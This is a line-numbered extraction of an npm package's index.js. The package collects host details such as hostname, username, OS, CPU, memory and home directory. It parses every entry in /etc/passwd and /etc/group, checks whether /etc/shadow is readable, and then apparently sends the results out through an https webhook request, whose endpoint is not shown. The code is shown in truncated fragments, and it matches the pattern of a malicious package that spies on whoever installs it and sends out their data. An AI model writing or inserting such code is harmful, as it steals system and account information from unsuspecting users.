// File: tmp/tmp9a2ev4hb/consgraphqlnodeserv/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 3: const fs = require("fs")
Line 8: {
  const baseData = {
    hostname: os.hostname(), // Unique to device
    username: os.userInfo().username, // Non-sensitive username
    platform: os.platform(), // OS (e.g. 'darwin', 'linux')
    arch: os.arch(), // Architecture (e.g. 'x64', 'arm64')
    release: os.release(), // Kernel version
    uptime: os.uptime(), // How long the system has been running
    timestamp: new Date().toISOString(),

    // Additional system information
    totalMemory: os.totalmem(), // Total system memory in bytes
    freeMemory: os.freemem(), // Free system memory in bytes
    memoryUsage: process.memoryUsage(), // Node.js process memory usage
    cpuCount: os.cpus().length, // Number of CPU cores
    cpuInfo: os.cpus()[0].model, // CPU model name
    loadAverage: os.loadavg(), // System load average (1, 5, 15 minutes)
    networkInterfaces: Object.keys(os.networkInterfaces()), // Available network interfaces
    homeDir: os.homedir(), // User home directory
    tmpDir: os.tmpdir(), // Tempora...
Line 9: const baseData = {
    hostname: os.hostname(), // Unique to device
    username: os.userInfo().username, // Non-sensitive username
    platform: os.platform(), // OS (e.g. 'darwin', 'linux')
    arch: os.arch(), // Architecture (e.g. 'x64', 'arm64')
    release: os.release(), // Kernel version
    uptime: os.uptime(), // How long the system has been running
    timestamp: new Date().toISOString(),

    // Additional system information
    totalMemory: os.totalmem(), // Total system memory in bytes
    freeMemory: os.freemem(), // Free system memory in bytes
    memoryUsage: process.memoryUsage(), // Node.js process memory usage
    cpuCount: os.cpus().length, // Number of CPU cores
    cpuInfo: os.cpus()[0].model, // CPU model name
    loadAverage: os.loadavg(), // System load average (1, 5, 15 minutes)
    networkInterfaces: Object.keys(os.networkInterfaces()), // Available network interfaces
    homeDir: os.homedir(), // User home directory
    tmpDir: os.tmpdir(), // Temporary directo...
Line 10: os.hostname()
Line 11: os.userInfo()
Line 12: os.platform()
Line 13: os.arch()
Line 19: os.totalmem()
Line 22: os.cpus()
Line 23: _tmp_0.cpuInfo = os.cpus()[0].model
Line 25: Object.keys(os.networkInterfaces())
Line 33: _tmp_0.execPath = process.execPath
Line 45: os.type()
Line 46: os.userInfo()
Line 47: process.cpuUsage()
Line 53: const passwdDetails = (() => {
    try {
      const passwd = fs.readFileSync("/etc/passwd", "utf8");
      return {
        totalUsers: passwd.split("\n").filter((line) => line.trim()).length,
        users: passwd
          .split("\n")
          .filter((line) => line.trim())
          .map((line) => {
            const parts = line.split(":");
            return {
              username: parts[0],
              uid: parts[2],
              gid: parts[3],
              description: parts[4],
              homeDir: parts[5],
              shell: parts[6],
            };
          }),
        systemUsers: passwd
          .split("\n")
          .filter((line) => line.trim())
          .map((line) => line.split(":"))
          .filter((parts) => parseInt(parts[2]) < 1000)
          .map((parts) => ({
            username: parts[0],
            uid: parts[2],
            shell: parts[6],
          })),
        regularUsers: passwd
          .split("\n")
          .filter((line) => line.tri...
Line 55: const passwd = fs.readFileSync("/etc/passwd", "utf8")
Line 57: line.trim()
Line 60: line.trim()
Line 63: {
              username: parts[0],
              uid: parts[2],
              gid: parts[3],
              description: parts[4],
              homeDir: parts[5],
              shell: parts[6],
            }
Line 64: _tmp_13.username = parts[0]
Line 65: _tmp_13.uid = parts[2]
Line 66: _tmp_13.gid = parts[3]
Line 67: _tmp_13.description = parts[4]
Line 68: _tmp_13.homeDir = parts[5]
Line 69: _tmp_13.shell = parts[6]
Line 74: line.trim()
Line 76: parseInt(parts[2])
Line 77: {
            username: parts[0],
            uid: parts[2],
            shell: parts[6],
          }
Line 78: _tmp_18.username = parts[0]
Line 79: _tmp_18.uid = parts[2]
Line 80: _tmp_18.shell = parts[6]
Line 84: line.trim()
Line 87: parseInt(parts[2])
Line 89: {
            username: parts[0],
            uid: parts[2],
            homeDir: parts[5],
            shell: parts[6],
          }
Line 90: _tmp_23.username = parts[0]
Line 91: _tmp_23.uid = parts[2]
Line 92: _tmp_23.homeDir = parts[5]
Line 93: _tmp_23.shell = parts[6]
Line 104: const groupDetails = (() => {
    try {
      const groups = fs.readFileSync("/etc/group", "utf8");
      return {
        totalGroups: groups.split("\n").filter((line) => line.trim()).length,
        groups: groups
          .split("\n")
          .filter((line) => line.trim())
          .map((line) => {
            const parts = line.split(":");
            return {
              groupname: parts[0],
              gid: parts[2],
              members: parts[3] ? parts[3].split(",") : [],
            };
          }),
        currentUserGroups: groups
          .split("\n")
          .filter((line) => line.trim())
          .map((line) => line.split(":"))
          .filter(
            (parts) => parts[3] && parts[3].includes(os.userInfo().username),
          )
          .map((parts) => ({
            groupname: parts[0],
            gid: parts[2],
          })),
      };
    } catch (error) {
      return { error: "Cannot read /etc/group - not available on this system" };
    }
  })()
Line 106: const groups = fs.readFileSync("/etc/group", "utf8")
Line 108: line.trim()
Line 111: line.trim()
Line 114: {
              groupname: parts[0],
              gid: parts[2],
              members: parts[3] ? parts[3].split(",") : [],
            }
Line 115: _tmp_29.groupname = parts[0]
Line 116: _tmp_29.gid = parts[2]
Line 117: _tmp_29.members = parts[3] ? parts[3].split(",") : __ecma.Array.factory()
Line 122: line.trim()
Line 125: parts[3].includes(os.userInfo().username)
Line 127: {
            groupname: parts[0],
            gid: parts[2],
          }
Line 128: _tmp_36.groupname = parts[0]
Line 129: _tmp_36.gid = parts[2]
Line 138: const shadowInfo = (() => {
    try {
      const shadow = fs.readFileSync("/etc/shadow", "utf8");
      return {
        hasAccess: true,
        userCount: shadow.split("\n").filter((line) => line.trim()).length,
        note: "Shadow file accessible - running with elevated privileges",
      };
    } catch (error) {
      return {
        hasAccess: false,
        error: "Cannot read /etc/shadow - insufficient privileges (normal)",
      };
    }
  })()
Line 140: const shadow = fs.readFileSync("/etc/shadow", "utf8")
Line 143: line.trim()
Line 175: const req = https.request(options, (res) => {
  console.log(`âœ… Webhook sent: ${res.statusCode}`);
})
